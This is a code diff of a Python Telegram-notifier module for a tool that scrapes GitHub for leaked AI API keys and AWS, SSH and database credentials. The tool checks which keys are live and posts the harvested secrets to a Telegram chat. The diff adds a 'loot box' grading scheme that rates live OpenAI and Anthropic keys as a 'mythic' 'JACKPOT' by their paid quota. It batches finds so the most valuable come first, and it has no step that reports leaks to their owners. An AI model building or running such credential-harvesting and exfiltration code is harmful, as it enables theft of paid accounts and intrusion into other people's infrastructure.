@@ -11,17 +11,56 @@ log = logging.getLogger(__name__)
 _URL     = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
 _DOC_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
 
-# ── Unverified-key buffer (batched every 15 min as text file) ──────────────────
-_BUFFER: list[dict] = []
-_BUFFER_LOCK: asyncio.Lock | None = None
+# ── Rarity / drop tier system ──────────────────────────────────────────────
+# Every find is graded common → mythic, like a loot box drop:
+#   1) provider value     (OpenAI/Anthropic top, owner's own service floor)
+#   2) verification state (validated > unverified)
+#   3) key format         (sk-proj-/sk-svcacct-/sk-ant-api03- = paid-tier signal)
+#   4) infra risk score   (high-risk DB/AWS/SSH = mythic; deploy tokens = common)
+
+_RARITY_TIERS = {
+    "mythic":    {"emoji": "🌈", "bar": "🟥🟧🟨🟩🟦🟪", "title": "MYTHIC",    "shout": "JACKPOT"},
+    "legendary": {"emoji": "🟧", "bar": "🟧🟧🟧🟧🟧🟧", "title": "LEGENDARY", "shout": "VALID DROP"},
+    "epic":      {"emoji": "🟪", "bar": "🟪🟪🟪🟪🟪🟪", "title": "EPIC",      "shout": "high-tier find"},
+    "rare":      {"emoji": "🟦", "bar": "🟦🟦🟦🟦🟦🟦", "title": "RARE",      "shout": "solid find"},
+    "uncommon":  {"emoji": "🟩", "bar": "🟩🟩🟩🟩🟩🟩", "title": "UNCOMMON",  "shout": "minor find"},
+    "common":    {"emoji": "⬜", "bar": "⬜⬜⬜⬜⬜⬜", "title": "COMMON",    "shout": "noise"},
+}
+
+_RARITY_ORDER = ["mythic", "legendary", "epic", "rare", "uncommon", "common"]
 
 
-def _lock() -> asyncio.Lock:
-    global _BUFFER_LOCK
-    if _BUFFER_LOCK is None:
-        _BUFFER_LOCK = asyncio.Lock()
-    return _BUFFER_LOCK
+def _ai_rarity(provider: str, key: str, is_valid: bool) -> str:
+    """Drop tier for an AI-provider key find."""
+    if is_valid:
+        if provider in ("openai", "anthropic"):
+            return "mythic"      # paid tier, $200+/mo typical quota
+        return "legendary"        # any other live key
+    if "sk-proj-" in key or "sk-svcacct-" in key or "sk-ant-api03-" in key:
+        return "epic"             # paid-tier format signal even unverified
+    if provider in ("openai", "anthropic", "google", "deepseek", "elevenlabs"):
+        return "rare"
+    if provider in ("ark", "happyhorse"):
+        return "uncommon"
+    return "common"
 
+
+def _infra_rarity(cred_type: str, risk_level: str, destination: str) -> str:
+    """Drop tier for an infra credential find."""
+    if risk_level == "high":
+        if cred_type in ("aws", "ssh", "database"):
+            return "mythic"
+        return "legendary"
+    if risk_level == "medium":
+        if cred_type in ("aws", "ssh"):
+            return "epic"
+        return "rare"
+    if cred_type in ("database", "aws", "ssh") and destination:
+        return "uncommon"
+    return "common"
+
+
+# ── Provider / cred-type visual identity ───────────────────────────────────
 _PROVIDER_EMOJI = {
     "openai":     "🟢",
     "anthropic":  "🟣",
@@ -32,13 +71,38 @@ _PROVIDER_EMOJI = {
     "happyhorse": "🐴",
 }
 
+_CRED_EMOJI = {
+    "database": "🗄️",
+    "ssh":      "🔐",
+    "aws":      "☁️",
+    "alibaba":  "🔶",
+    "azure":    "🔷",
+    "infra":    "🚀",
+}
+
+_RISK_EMOJI = {"high": "🔴", "medium": "🟡", "low": "⚪"}
+
+
+# ── Unified drop buffer (flushed every 15 min as ONE Telegram document) ────
+# Holds both AI keys (kind="ai") and infra creds (kind="infra"). No per-find
+# Telegram messages — every drop waits for the next 15-min roulette spin.
+_BUFFER: list[dict] = []
+_BUFFER_LOCK: asyncio.Lock | None = None
+
+
+def _lock() -> asyncio.Lock:
+    global _BUFFER_LOCK
+    if _BUFFER_LOCK is None:
+        _BUFFER_LOCK = asyncio.Lock()
+    return _BUFFER_LOCK
+
 
 async def _send(text: str, parse_mode: str = "HTML"):
     try:
         async with httpx.AsyncClient(timeout=15) as c:
             await c.post(_URL, json={
                 "chat_id": TELEGRAM_CHAT_ID,
-                "text": text[:4096],  # Telegram message limit
+                "text": text[:4096],
                 "parse_mode": parse_mode,
                 "disable_web_page_preview": True,
             })
@@ -46,38 +110,65 @@ async def _send(text: str, parse_mode: str = "HTML"):
         log.error("telegram send err: %s", e)
 
 
+# ── Per-find: buffer only, no immediate send ───────────────────────────────
+
 async def notify_found(provider: str, key: str, repo: str, file_path: str,
                        file_url: str, stars: int, created_at: str,
                        file_type: str, is_valid: bool):
-    emoji = _PROVIDER_EMOJI.get(provider, "🔑")
-    age   = created_at[:10] if created_at else "unknown"
+    """Buffer an AI-key drop for the next 15-min roulette flush."""
+    rarity = _ai_rarity(provider, key, is_valid)
+    async with _lock():
+        _BUFFER.append({
+            "kind":      "ai",
+            "rarity":    rarity,
+            "is_valid":  bool(is_valid),
+            "provider":  provider,
+            "key":       key,
+            "repo":      repo,
+            "stars":     stars,
+            "file_path": file_path,
+            "file_url":  file_url,
+            "file_type": file_type,
+            "age":       created_at[:10] if created_at else "unknown",
+        })
 
-    if is_valid:
-        # Valid keys → immediate individual message
-        msg = (
-            f"✅ VALID LIVE KEY {emoji}\n"
-            f"<b>Provider:</b> {provider.upper()}\n"
-            f"<b>Key:</b> <code>{key}</code>\n"
-            f"<b>Repo:</b> <a href='https://github.com/{repo}'>{repo}</a>\n"
-            f"<b>Stars:</b> ⭐ {stars}  |  created {age}\n"
-            f"<b>File:</b> <a href='{file_url}'>{file_path}</a>\n"
-            f"<b>Type:</b> {file_type}"
-        )
-        await _send(msg)
-    else:
-        # Unverified → buffer, flushed every 15 min as text file
-        async with _lock():
-            _BUFFER.append({
-                "provider": provider, "key": key, "repo": repo,
-                "file_path": file_path, "file_url": file_url,
-                "stars": stars, "file_type": file_type, "age": age,
-            })
 
+async def notify_infra_found(cred_type: str, cred: str, repo: str,
+                              file_path: str, file_url: str,
+                              stars: int, created_at: str, file_type: str,
+                              destination: str, risk_level: str,
+                              risk_reasons: list[str]):
+    """Buffer an infra-cred drop for the next 15-min roulette flush.
+    Low-risk findings are still skipped (DB-only) — match prior behavior."""
+    if risk_level == "low":
+        return
+    rarity  = _infra_rarity(cred_type, risk_level, destination)
+    preview = cred[:25] + "..." + cred[-10:] if len(cred) > 35 else cred[:20] + "..."
+    async with _lock():
+        _BUFFER.append({
+            "kind":         "infra",
+            "rarity":       rarity,
+            "cred_type":    cred_type,
+            "preview":      preview,
+            "destination":  destination or "",
+            "risk_level":   risk_level,
+            "risk_reasons": list(risk_reasons or []),
+            "repo":         repo,
+            "stars":        stars,
+            "file_path":    file_path,
+            "file_url":     file_url,
+            "file_type":    file_type,
+            "age":          created_at[:10] if created_at else "unknown",
+        })
+
+
+# ── 15-min unified roulette flush ──────────────────────────────────────────
 
 async def flush_unverified_buffer() -> int:
     """
-    Send buffered unverified finds as a Telegram document (text file).
-    Clears the buffer. Returns number of keys sent.
+    Send buffered drops (AI + infra) as Telegram document(s) with a
+    rarity-breakdown caption (mythic → common). Splits into multiple files
+    of CHUNK rows so nothing is silently dropped. Clears buffer.
     """
     async with _lock():
         if not _BUFFER:
@@ -85,65 +176,118 @@ async def flush_unverified_buffer() -> int:
         data = list(_BUFFER)
         _BUFFER.clear()
 
-    by_prov: dict[str, list] = {}
+    by_rarity: dict[str, list] = {}
     for r in data:
-        by_prov.setdefault(r["provider"], []).append(r)
+        by_rarity.setdefault(r["rarity"], []).append(r)
 
-    now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
-    lines = [
-        f"⚠️  Unverified keys batch — {now_str}",
-        f"Total: {len(data)}  |  Providers: {len(by_prov)}",
-        "=" * 72,
-    ]
-    CHUNK = 200  # keys per file to stay well under Telegram's 50 MB doc limit
+    n_ai    = sum(1 for r in data if r["kind"] == "ai")
+    n_infra = sum(1 for r in data if r["kind"] == "infra")
+    n_valid = sum(1 for r in data if r["kind"] == "ai" and r.get("is_valid"))
 
-    # Split ALL findings into chunks of CHUNK keys, regardless of provider.
-    # Each chunk becomes a separate Telegram document — nothing is silently dropped.
-    all_rows = []
-    for prov in sorted(by_prov):
-        for r in by_prov[prov]:
-            all_rows.append(r)
+    # Sort all rows mythic → common; first chunk has the juiciest finds
+    all_rows: list[dict] = []
+    for rarity in _RARITY_ORDER:
+        all_rows.extend(by_rarity.get(rarity, []))
 
+    CHUNK = 200
     chunks = [all_rows[i: i + CHUNK] for i in range(0, len(all_rows), CHUNK)]
     total_files = len(chunks)
+    tiers_present = [t for t in _RARITY_ORDER if t in by_rarity]
+
+    # Caption: same on every chunk so each file shows the full breakdown
+    cap_lines = [
+        f"🎰 <b>Roulette batch</b> — {len(data)} drops",
+        f"🤖 AI: {n_ai} ({n_valid} ✅ valid)  |  🏗️ Infra: {n_infra}",
+    ]
+    for rarity in _RARITY_ORDER:
+        if rarity not in by_rarity:
+            continue
+        t = _RARITY_TIERS[rarity]
+        cap_lines.append(f"{t['emoji']} <b>{t['title']}</b>: {len(by_rarity[rarity])}")
+    base_caption = "\n".join(cap_lines)
 
     try:
         async with httpx.AsyncClient(timeout=30) as c:
             for idx, chunk in enumerate(chunks, 1):
-                chunk_by_prov: dict[str, list] = {}
+                # Group THIS chunk: rarity → source_label → list
+                #   AI:    "🟢 OPENAI"
+                #   Infra: "☁️ AWS [🔴HIGH]"
+                chunk_groups: dict[str, dict[str, list]] = {}
                 for r in chunk:
-                    chunk_by_prov.setdefault(r["provider"], []).append(r)
+                    rar = r["rarity"]
+                    if r["kind"] == "ai":
+                        src = f"{_PROVIDER_EMOJI.get(r['provider'], '🔑')} {r['provider'].upper()}"
+                    else:
+                        risk_e = _RISK_EMOJI.get(r["risk_level"], "⚪")
+                        src = (f"{_CRED_EMOJI.get(r['cred_type'], '🔑')} "
+                               f"{r['cred_type'].upper()} [{risk_e}{r['risk_level'].upper()}]")
+                    chunk_groups.setdefault(rar, {}).setdefault(src, []).append(r)
 
-                now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
-                file_hdr = f"part {idx}/{total_files}" if total_files > 1 else ""
+                now_str  = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
+                part_hdr = f" — part {idx}/{total_files}" if total_files > 1 else ""
+
                 lines = [
-                    f"⚠️  Unverified keys batch — {now_str} {file_hdr}".strip(),
-                    f"Total: {len(data)}  |  This file: {len(chunk)}  |  Providers: {len(chunk_by_prov)}",
-                    "=" * 72,
+                    "╔══════════════════════════════════════════════════════════════════════╗",
+                    f"║  🎰 ROULETTE BATCH — {now_str}{part_hdr}",
+                    f"║  Total batch: {len(data)} drops  |  This file: {len(chunk)}",
+                    f"║  🤖 AI: {n_ai} ({n_valid} verified)  |  🏗️ Infra: {n_infra}  |  Tiers: {len(tiers_present)}/6",
+                    "╠══════════════════════════════════════════════════════════════════════╣",
                 ]
-                for prov in sorted(chunk_by_prov):
-                    e    = _PROVIDER_EMOJI.get(prov, "🔑")
-                    rows = chunk_by_prov[prov]
-                    lines.append(f"\n{e} {prov.upper()} — {len(rows)} keys")
-                    lines.append("-" * 60)
-                    for r in rows:
-                        lines.append(
-                            f"  {r['key']}\n"
-                            f"    repo={r['repo']}  ⭐{r['stars']}  type={r['file_type']}\n"
-                            f"    {r['file_url']}"
-                        )
+                # Histogram (full batch, not just this chunk)
+                for rarity in _RARITY_ORDER:
+                    n   = len(by_rarity.get(rarity, []))
+                    t   = _RARITY_TIERS[rarity]
+                    bar = "█" * min(n, 40) if n else "·"
+                    lines.append(f"║  {t['emoji']} {t['title']:<10} {n:>4}  {bar}")
+                lines.append("╚══════════════════════════════════════════════════════════════════════╝")
+
+                # Per-tier sections (only tiers in this chunk)
+                for rarity in _RARITY_ORDER:
+                    if rarity not in chunk_groups:
+                        continue
+                    tier         = _RARITY_TIERS[rarity]
+                    bar          = tier["bar"]
+                    rows_in_tier = sum(len(v) for v in chunk_groups[rarity].values())
+                    lines.append("")
+                    lines.append(f"{bar}{bar}")
+                    lines.append(f"  {tier['emoji']} {tier['title']} TIER — {rows_in_tier} drops")
+                    lines.append(f"{bar}{bar}")
+
+                    for src in sorted(chunk_groups[rarity]):
+                        src_rows = chunk_groups[rarity][src]
+                        lines.append("")
+                        lines.append(f"  {src} ({len(src_rows)})")
+                        lines.append(f"  {'─' * 64}")
+                        for r in src_rows:
+                            if r["kind"] == "ai":
+                                badge = "✅ VALID " if r.get("is_valid") else "         "
+                                lines.append(
+                                    f"    {badge} {r['key']}\n"
+                                    f"      repo: {r['repo']}  ⭐{r['stars']}  type: {r['file_type']}\n"
+                                    f"      {r['file_url']}"
+                                )
+                            else:
+                                dest    = f"  →  {r['destination']}" if r['destination'] else ""
+                                reasons = ", ".join(r["risk_reasons"][:3]) or "—"
+                                lines.append(
+                                    f"    {r['preview']}{dest}\n"
+                                    f"      repo: {r['repo']}  ⭐{r['stars']}  type: {r['file_type']}\n"
+                                    f"      risk: {reasons}\n"
+                                    f"      {r['file_url']}"
+                                )
 
                 content = "\n".join(lines).encode("utf-8")
-                caption = (
-                    f"⚠️ {len(chunk)} keys"
-                    + (f" [{idx}/{total_files}]" if total_files > 1 else "")
-                    + f" | {', '.join(f'{p.upper()}={len(v)}' for p, v in sorted(chunk_by_prov.items()))}"
-                )[:1024]
+                caption = (base_caption + (f"\n\n📎 Part {idx}/{total_files}"
+                                           if total_files > 1 else ""))[:1024]
+                fname   = f"roulette_{idx}.txt" if total_files > 1 else "roulette.txt"
 
-                fname = f"keys_{idx}.txt" if total_files > 1 else "keys.txt"
                 await c.post(
                     _DOC_URL,
-                    data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
+                    data={
+                        "chat_id":    TELEGRAM_CHAT_ID,
+                        "caption":    caption,
+                        "parse_mode": "HTML",
+                    },
                     files={"document": (fname, io.BytesIO(content), "text/plain")},
                 )
     except Exception as e:
@@ -152,15 +296,18 @@ async def flush_unverified_buffer() -> int:
     return len(data)
 
 
+# ── Periodic summaries (not per-find, fired by their own schedules) ────────
+
 async def notify_cycle_done(stats: dict):
     by_prov = stats.get("by_provider", [])
     lines = [
-        f"🔄 <b>Scan cycle done</b>",
-        f"Repos: {stats['repos_scanned']} | Files: {stats['files_scanned']}",
-        f"Keys found: <b>{stats['keys_found']}</b>  Valid: <b style='color:green'>{stats['keys_valid']}</b>",
+        "🔄 <b>Scan cycle done</b>",
+        f"📦 Repos: {stats['repos_scanned']}  |  📄 Files: {stats['files_scanned']}",
+        f"🔑 Found: <b>{stats['keys_found']}</b>  |  ✅ Valid: <b>{stats['keys_valid']}</b>",
     ]
     if by_prov:
-        lines.append("\n<b>By provider (all-time):</b>")
+        lines.append("")
+        lines.append("<b>By provider (all-time):</b>")
         for row in by_prov:
             e = _PROVIDER_EMOJI.get(row["provider"], "🔑")
             lines.append(f"{e} {row['provider'].upper()}: {row['total']} found, {row['valid']} valid")
@@ -176,22 +323,21 @@ async def notify_hourly_digest(by_provider: list[dict], total_new: int,
     now_str = datetime.now(timezone.utc).strftime("%H:%M UTC")
     lines = [
         f"🕐 <b>Hourly digest @ {now_str}</b>",
-        f"New this hour: <b>{total_new}</b> keys  |  Valid: <b>{total_valid}</b>",
+        f"New this hour: <b>{total_new}</b>  |  ✅ Valid: <b>{total_valid}</b>",
         "",
-        "<b>Breakdown by provider:</b>",
+        "<b>By provider:</b>",
     ]
-
     for row in by_provider:
-        e    = _PROVIDER_EMOJI.get(row["provider"], "🔑")
-        prov = row["provider"].upper()
-        cnt  = row["cnt"]
-        v    = row["valid_cnt"]
+        e     = _PROVIDER_EMOJI.get(row["provider"], "🔑")
+        prov  = row["provider"].upper()
+        cnt   = row["cnt"]
+        v     = row["valid_cnt"]
         badge = " ✅" if v > 0 else ""
         lines.append(f"{e} {prov}: {cnt} new, {v} valid{badge}")
 
     if new_valid_keys:
         lines.append("")
-        lines.append("<b>Fresh valid keys:</b>")
+        lines.append("🌈 <b>Fresh valid drops:</b>")
         for k in new_valid_keys[:5]:
             e = _PROVIDER_EMOJI.get(k["provider"], "🔑")
             lines.append(
@@ -202,49 +348,8 @@ async def notify_hourly_digest(by_provider: list[dict], total_new: int,
     await _send("\n".join(lines))
 
 
-# ── Infrastructure credential alerts ───────────────────────────────────────
-
-_RISK_EMOJI = {"high": "🔴", "medium": "🟡", "low": "⚪"}
-_CRED_EMOJI = {
-    "database": "🗄️",
-    "ssh":      "🔐",
-    "aws":      "☁️",
-    "alibaba":  "🔶",
-    "azure":    "🔷",
-    "infra":    "🚀",
-}
-
-
-async def notify_infra_found(cred_type: str, cred: str, repo: str,
-                              file_path: str, file_url: str,
-                              stars: int, created_at: str, file_type: str,
-                              destination: str, risk_level: str,
-                              risk_reasons: list[str]):
-    if risk_level == "low":
-        return  # low-risk: stored in DB, не шумим в Telegram
-
-    risk_e = _RISK_EMOJI.get(risk_level, "⚪")
-    cred_e = _CRED_EMOJI.get(cred_type, "🔑")
-    age    = created_at[:10] if created_at else "unknown"
-
-    preview = cred[:25] + "..." + cred[-10:] if len(cred) > 35 else cred[:20] + "..."
-    dest_line    = f"\n<b>Destination:</b> <code>{destination}</code>" if destination else ""
-    reasons_txt  = "\n".join(f"  • {r}" for r in risk_reasons[:5]) or "—"
-
-    msg = (
-        f"{risk_e} <b>INFRA CRED — {risk_level.upper()} RISK</b> {cred_e}\n"
-        f"<b>Type:</b> {cred_type.upper()}  |  <b>File:</b> {file_type}\n"
-        f"<b>Preview:</b> <code>{preview}</code>"
-        f"{dest_line}\n"
-        f"<b>Repo:</b> <a href='https://github.com/{repo}'>{repo}</a>  ⭐{stars}  ({age})\n"
-        f"<b>File:</b> <a href='{file_url}'>{file_path}</a>\n"
-        f"<b>Risk factors:</b>\n{reasons_txt}"
-    )
-    await _send(msg)
-
-
 async def notify_dead_token(token_preview: str):
-    """Alert when a GitHub PAT returns 401 (revoked / expired)."""
+    """Alert when a GitHub PAT returns 401 (revoked / expired). Immediate — rare critical event."""
     await _send(
         f"💀 <b>GITHUB TOKEN DEAD</b>\n"
         f"Token <code>{token_preview}...</code> returned 401.\n"
@@ -255,7 +360,7 @@ async def notify_dead_token(token_preview: str):
 async def notify_infra_hourly(by_type: list[dict], total: int, high: int):
     if total == 0:
         return
-    lines = [f"\n🏗️ <b>Infra credentials this hour: {total}</b> ({high} high-risk)"]
+    lines = [f"🏗️ <b>Infra credentials this hour: {total}</b> ({high} high-risk)"]
     for row in by_type:
         e     = _CRED_EMOJI.get(row["cred_type"], "🔑")
         hc    = row.get("high_cnt", 0)
